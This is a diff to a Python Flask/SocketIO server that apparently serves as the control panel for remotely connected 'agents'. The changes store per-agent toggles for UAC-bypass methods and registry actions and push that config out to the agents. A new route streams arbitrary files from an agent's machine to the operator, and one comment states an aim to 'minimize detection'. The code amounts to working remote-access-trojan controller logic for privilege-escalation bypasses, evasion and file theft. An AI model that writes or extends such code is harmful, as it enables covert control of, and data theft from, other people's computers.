@@ -1229,8 +1229,9 @@ socketio = SocketIO(
     allow_upgrades=False,  # Disable upgrades to prevent WebSocket issues
     manage_session=True,  # Changed from False to True for proper session management
     max_http_buffer_size=50 * 1024 * 1024,
-    ping_interval=25,
-    ping_timeout=60,
+    ping_interval=20,
+    ping_timeout=120,
+    async_handlers=True,
     logger=False,
     engineio_logger=False,
     transports=['websocket', 'polling']  # Explicit transports
@@ -3108,6 +3109,16 @@ FILE_METADATA_CACHE = {}
 FILE_METADATA_CACHE_LOCK = threading.Lock()
 CACHE_TTL = 300
 
+def _cooperative_yield():
+    try:
+        if ASYNC_MODE == 'eventlet':
+            import eventlet
+            eventlet.sleep(0)
+        else:
+            time.sleep(0)
+    except Exception:
+        pass
+
 def get_cached_metadata(agent_id: str, file_path: str):
     key = f"{agent_id}:{file_path}"
     with FILE_METADATA_CACHE_LOCK:
@@ -3624,30 +3635,37 @@ def _parse_dict_from_client(var_name: str):
 
 def _parse_bypass_sequence():
     try:
-        path = os.path.join(os.getcwd(), 'client.py')
-        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
-            content = f.read()
-        m = re.search(r"def\s+get_bypass_methods_sequence\(\):\s*return\s*\[\s*(.*?)\s*\]", content, re.S)
-        if not m:
-            return []
-        block = m.group(1)
-        entries = re.findall(r"\{\s*'id':\s*(\d+),\s*'name':\s*'([^']+)'\s*\}", block)
-        return [{'id': int(i), 'name': n} for i, n in entries]
+        s = load_settings()
+        methods = list((s.get('bypasses', {}).get('methods') or {}).keys())
+        # Provide a simple deterministic sequence based on current keys
+        return [{'id': i + 1, 'name': k} for i, k in enumerate(methods)]
     except Exception:
         return []
 
 @app.route('/api/system/bypasses', methods=['GET'])
 def api_system_bypasses():
-    methods = _parse_dict_from_client('UAC_BYPASS_METHODS_ENABLED')
-    sequence = _parse_bypass_sequence()
-    g_enabled = bool(getattr(agent_client, 'BYPASSES_ENABLED', False)) if agent_client else False
-    return jsonify({'methods': methods, 'sequence': sequence, 'global_enabled': g_enabled})
+    try:
+        s = load_settings()
+        b = s.get('bypasses', {}) or {}
+        m = b.get('methods', {}) or {}
+        methods = [{'key': k, 'enabled': bool(v)} for k, v in m.items()]
+        sequence = _parse_bypass_sequence()
+        g_enabled = bool(b.get('enabled', False))
+        return jsonify({'methods': methods, 'sequence': sequence, 'global_enabled': g_enabled})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
 
 @app.route('/api/system/registry', methods=['GET'])
 def api_system_registry():
-    actions = _parse_dict_from_client('REGISTRY_ACTIONS')
-    g_enabled = bool(getattr(agent_client, 'REGISTRY_ENABLED', False)) if agent_client else False
-    return jsonify({'actions': actions, 'global_enabled': g_enabled})
+    try:
+        s = load_settings()
+        r = s.get('registry', {}) or {}
+        a = r.get('actions', {}) or {}
+        actions = [{'key': k, 'enabled': bool(v)} for k, v in a.items()]
+        g_enabled = bool(r.get('enabled', False))
+        return jsonify({'actions': actions, 'global_enabled': g_enabled})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
 
 @app.route('/api/system/bypasses/test', methods=['POST'])
 def api_system_bypasses_test():
@@ -3656,13 +3674,11 @@ def api_system_bypasses_test():
         key = str(data.get('key') or '')
         if not key:
             return jsonify({'success': False, 'error': 'Missing key'}), 400
-        if agent_client and hasattr(agent_client, 'debug_bypass_method'):
-            res = agent_client.debug_bypass_method(key)
-            return jsonify({'success': True, 'result': res})
-        # Fallback: simulate based on parsed config
-        methods = _parse_dict_from_client('UAC_BYPASS_METHODS_ENABLED')
-        enabled = any(m['key'] == key and m['enabled'] for m in methods)
-        return jsonify({'success': True, 'result': {'method': key, 'enabled': enabled, 'executed': enabled}})
+        # Read from settings only; do not execute on agent to minimize detection
+        s = load_settings()
+        m = (s.get('bypasses', {}) or {}).get('methods', {}) or {}
+        enabled = bool(m.get(key, False))
+        return jsonify({'success': True, 'result': {'method': key, 'enabled': enabled, 'executed': False}})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)}), 500
 
@@ -3892,45 +3908,51 @@ def api_system_bypasses_toggle():
             logger.warning(f"Invalid global_enabled type for bypass toggle: {type(global_enabled)}")
             return jsonify({'success': False, 'error': 'Invalid global_enabled format'}), 400
         
-        # Apply changes to agent client if available
+        # Persist to settings.json
+        s = load_settings()
+        b = s.get('bypasses', {}) or {}
+        if isinstance(global_enabled, bool):
+            b['enabled'] = global_enabled
+        if key:
+            methods = b.get('methods') or {}
+            methods[key] = bool(enabled)
+            b['methods'] = methods
+        s['bypasses'] = b
+        save_settings(s)
+        
+        # Apply changes to agent client if available (runtime only)
         if agent_client:
-            if isinstance(global_enabled, bool):
-                try:
+            try:
+                if isinstance(global_enabled, bool):
                     agent_client.BYPASSES_ENABLED = global_enabled
                     agent_client.DISABLE_UAC_BYPASS = not global_enabled
-                    logger.info(f"Updated global bypasses to {global_enabled} in agent client")
-                except Exception as e:
-                    logger.error(f"Failed to update global bypasses in agent client: {e}")
-                    
-            if key:
-                try:
-                    agent_client.UAC_BYPASS_METHODS_ENABLED[key] = enabled
-                    logger.info(f"Updated bypass {key} to {enabled} in agent client")
-                except Exception as e:
-                    logger.error(f"Failed to update bypass {key} in agent client: {e}")
-                    
-        # Apply changes to agent overrides
+                if key:
+                    agent_client.UAC_BYPASS_METHODS_ENABLED[key] = bool(enabled)
+            except Exception as e:
+                logger.error(f"Failed to update runtime client bypasses: {e}")
+        
+        # Apply per-agent overrides for live session
         if agent_id:
             if isinstance(global_enabled, bool):
                 AGENT_OVERRIDES['flags']['bypasses'][agent_id] = global_enabled
-                logger.info(f"Updated global bypasses flag for agent {agent_id} to {global_enabled}")
             if key:
-                AGENT_OVERRIDES['bypasses'].setdefault(agent_id, {})[key] = enabled
-                logger.info(f"Updated bypass {key} for agent {agent_id} to {enabled}")
-                
-        # Get current state
-        methods = _parse_dict_from_client('UAC_BYPASS_METHODS_ENABLED')
-        g_enabled = bool(getattr(agent_client, 'BYPASSES_ENABLED', False))
+                AGENT_OVERRIDES['bypasses'].setdefault(agent_id, {})[key] = bool(enabled)
         
-        if agent_id:
-            g_enabled = bool(AGENT_OVERRIDES['flags']['bypasses'].get(agent_id, False))
-            merged = {m['key']: m['enabled'] for m in methods}
-            merged.update(AGENT_OVERRIDES['bypasses'].get(agent_id, {}))
-            methods = [{'key': k, 'enabled': bool(v)} for k, v in merged.items()]
-            logger.info(f"Returning merged bypass state for agent {agent_id}: {len(methods)} methods, global_enabled: {g_enabled}")
-        else:
-            logger.info(f"Returning global bypass state: {len(methods)} methods, global_enabled: {g_enabled}")
-            
+        # Emit config update
+        try:
+            if agent_id:
+                _emit_agent_config(agent_id)
+            else:
+                for _aid, _data in AGENTS_DATA.items():
+                    if _data.get('sid'):
+                        _emit_agent_config(_aid)
+        except Exception:
+            pass
+        
+        # Return current state from settings
+        m = (s.get('bypasses', {}) or {}).get('methods', {}) or {}
+        methods = [{'key': k, 'enabled': bool(v)} for k, v in m.items()]
+        g_enabled = bool((s.get('bypasses', {}) or {}).get('enabled', False))
         return jsonify({'success': True, 'methods': methods, 'global_enabled': g_enabled})
         
     except Exception as e:
@@ -3982,44 +4004,36 @@ def api_system_registry_toggle():
                 logger.warning(f"Agent {agent_id} lacks admin privileges for registry operation")
                 return jsonify({'success': False, 'error': 'Admin privileges required', 'need_admin': True}), 403
         
-        # Apply changes to agent client if available
+        # Persist to settings.json
+        s = load_settings()
+        r = s.get('registry', {}) or {}
+        if isinstance(global_enabled, bool):
+            r['enabled'] = global_enabled
+        if key:
+            actions_map = r.get('actions') or {}
+            actions_map[key] = bool(enabled)
+            r['actions'] = actions_map
+        s['registry'] = r
+        save_settings(s)
+        
+        # Apply runtime changes to agent client
         if agent_client:
-            if isinstance(global_enabled, bool):
-                try:
+            try:
+                if isinstance(global_enabled, bool):
                     agent_client.REGISTRY_ENABLED = global_enabled
-                    logger.info(f"Updated global registry to {global_enabled} in agent client")
-                except Exception as e:
-                    logger.error(f"Failed to update global registry in agent client: {e}")
-                    
-            if key:
-                try:
-                    agent_client.REGISTRY_ACTIONS[key] = enabled
-                    logger.info(f"Updated registry action {key} to {enabled} in agent client")
-                except Exception as e:
-                    logger.error(f"Failed to update registry action {key} in agent client: {e}")
-                    
-        # Apply changes to agent overrides
+                if key:
+                    agent_client.REGISTRY_ACTIONS[key] = bool(enabled)
+            except Exception as e:
+                logger.error(f"Failed to update runtime client registry: {e}")
+        
+        # Apply per-agent overrides for live session
         if agent_id:
             if isinstance(global_enabled, bool):
                 AGENT_OVERRIDES['flags']['registry'][agent_id] = global_enabled
-                logger.info(f"Updated global registry flag for agent {agent_id} to {global_enabled}")
             if key:
-                AGENT_OVERRIDES['registry'].setdefault(agent_id, {})[key] = enabled
-                logger.info(f"Updated registry action {key} for agent {agent_id} to {enabled}")
-                
-        # Get current state
-        actions = _parse_dict_from_client('REGISTRY_ACTIONS')
-        g_enabled = bool(getattr(agent_client, 'REGISTRY_ENABLED', False))
+                AGENT_OVERRIDES['registry'].setdefault(agent_id, {})[key] = bool(enabled)
         
-        if agent_id:
-            g_enabled = bool(AGENT_OVERRIDES['flags']['registry'].get(agent_id, False))
-            merged = {a['key']: a['enabled'] for a in actions}
-            merged.update(AGENT_OVERRIDES['registry'].get(agent_id, {}))
-            actions = [{'key': k, 'enabled': bool(v)} for k, v in merged.items()]
-            logger.info(f"Returning merged registry state for agent {agent_id}: {len(actions)} actions, global_enabled: {g_enabled}")
-        else:
-            logger.info(f"Returning global registry state: {len(actions)} actions, global_enabled: {g_enabled}")
-            
+        # Emit config update
         try:
             if agent_id:
                 _emit_agent_config(agent_id)
@@ -4029,6 +4043,11 @@ def api_system_registry_toggle():
                         _emit_agent_config(_aid)
         except Exception:
             pass
+        
+        # Return current state from settings
+        a = (s.get('registry', {}) or {}).get('actions', {}) or {}
+        actions = [{'key': k, 'enabled': bool(v)} for k, v in a.items()]
+        g_enabled = bool((s.get('registry', {}) or {}).get('enabled', False))
         return jsonify({'success': True, 'actions': actions, 'global_enabled': g_enabled})
         
     except Exception as e:
@@ -4040,15 +4059,14 @@ def api_system_agent_status():
     try:
         data = request.get_json(silent=True) or {}
         agent_id = str(data.get('agent_id') or '')
-        methods = _parse_dict_from_client('UAC_BYPASS_METHODS_ENABLED')
-        actions = _parse_dict_from_client('REGISTRY_ACTIONS')
+        s = load_settings()
+        m = (s.get('bypasses', {}) or {}).get('methods', {}) or {}
+        a = (s.get('registry', {}) or {}).get('actions', {}) or {}
         if agent_id:
-            m = {m['key']: m['enabled'] for m in methods}
-            a = {a['key']: a['enabled'] for a in actions}
             m.update(AGENT_OVERRIDES['bypasses'].get(agent_id, {}))
             a.update(AGENT_OVERRIDES['registry'].get(agent_id, {}))
-            methods = [{'key': k, 'enabled': bool(v)} for k, v in m.items()]
-            actions = [{'key': k, 'enabled': bool(v)} for k, v in a.items()]
+        methods = [{'key': k, 'enabled': bool(v)} for k, v in m.items()]
+        actions = [{'key': k, 'enabled': bool(v)} for k, v in a.items()]
         return jsonify({
             'success': True,
             'methods': methods,
@@ -4710,6 +4728,55 @@ def download_file(agent_id):
         'file_path': file_path
     })
 
+@app.route('/api/agents/<agent_id>/files/download_proxy', methods=['GET'])
+@require_auth
+def download_file_proxy(agent_id):
+    """Stream a file from agent to the operator as a single HTTP download.
+    This reduces browser Range round-trips for very large files."""
+    if agent_id not in AGENTS_DATA:
+        return jsonify({'error': 'Agent not found'}), 404
+    agent_sid = AGENTS_DATA[agent_id].get('sid')
+    if not agent_sid:
+        return jsonify({'error': 'Agent not connected'}), 400
+    file_path = request.args.get('path', '')
+    if not file_path:
+        return jsonify({'error': 'File path is required'}), 400
+    meta = _request_agent_file_range(agent_id, agent_sid, file_path, 0, 0, 30.0)
+    if not meta or meta.get('error'):
+        return jsonify({'error': meta.get('error') if meta else 'Timeout'}), 504
+    total_size = int(meta.get('total_size') or 0)
+    mime = _guess_mime(file_path)
+    filename = os.path.basename(file_path)
+    chunk_size = _get_stream_chunk_size(agent_id)
+    def _gen():
+        off = 0
+        while total_size <= 0 or off < total_size:
+            end = (off + chunk_size - 1) if total_size <= 0 else min(off + chunk_size - 1, total_size - 1)
+            data = _request_agent_file_range(agent_id, agent_sid, file_path, off, end, 30.0)
+            if not data:
+                break
+            if data.get('error'):
+                break
+            b64 = _extract_b64(data.get('data') or data.get('chunk'))
+            if not b64:
+                break
+            try:
+                raw = base64.b64decode(b64)
+            except Exception:
+                break
+            if not raw:
+                break
+            yield raw
+            off += len(raw)
+            _cooperative_yield()
+    resp = Response(stream_with_context(_gen()), mimetype=mime)
+    resp.headers['Content-Disposition'] = f'attachment; filename="{filename}"'
+    resp.headers['Cache-Control'] = 'no-store'
+    resp.headers['X-Accel-Buffering'] = 'no'
+    if total_size > 0:
+        resp.headers['Content-Length'] = str(total_size)
+    return resp
+
 @app.route('/api/agents/<agent_id>/files/upload', methods=['POST'])
 @require_auth
 def upload_file(agent_id):
@@ -4768,6 +4835,7 @@ def upload_file(agent_id):
                     }, room=agent_sid)
                     _upload_debug_log(upload_id, f"server_chunk off={off} len={len(chunk)}")
                     off += len(chunk)
+                    _cooperative_yield()
                     try:
                         prog = int(min(100, (off / float(total_size or 1)) * 100))
                         sid = UPLOAD_REQUESTERS.get(upload_id) or operator_sid or None
@@ -4846,7 +4914,19 @@ def upload_file_p2p(agent_id):
         from controller_p2p_transfer import start_p2p_upload
         port = start_p2p_upload(agent_ip, temp_path, upload_id)
         size = os.path.getsize(temp_path)
-        sha = hashlib.sha256(open(temp_path, 'rb').read()).hexdigest()
+        # Streamed SHA256 to avoid loading large files into memory and to yield cooperatively
+        sha_hasher = hashlib.sha256()
+        try:
+            with open(temp_path, 'rb') as _hfin:
+                while True:
+                    _hchunk = _hfin.read(1024 * 1024)
+                    if not _hchunk:
+                        break
+                    sha_hasher.update(_hchunk)
+                    _cooperative_yield()
+            sha = sha_hasher.hexdigest()
+        except Exception:
+            sha = ''
         socketio.emit('p2p_download_request', {
             'agent_id': agent_id,
             'upload_id': upload_id,
@@ -4928,6 +5008,7 @@ def upload_file_rest(agent_id, virtual_path, filename):
                     }, room=agent_sid)
                     _upload_debug_log(upload_id, f"rest_chunk off={off} len={len(chunk)}")
                     off += len(chunk)
+                    _cooperative_yield()
             socketio.emit('upload_file_complete', {
                 'agent_id': agent_id,
                 'upload_id': upload_id,
@@ -5235,8 +5316,8 @@ def stream_agent_file(agent_id):
 
     mime = _guess_mime(file_path)
     range_header = request.headers.get('Range')
-    timeout_s = 10.0
-    initial_chunk_size = 256 * 1024
+    timeout_s = 15.0
+    initial_chunk_size = _get_stream_chunk_size(agent_id)
 
     if range_header:
         m = _RANGE_RE.match(range_header.strip())
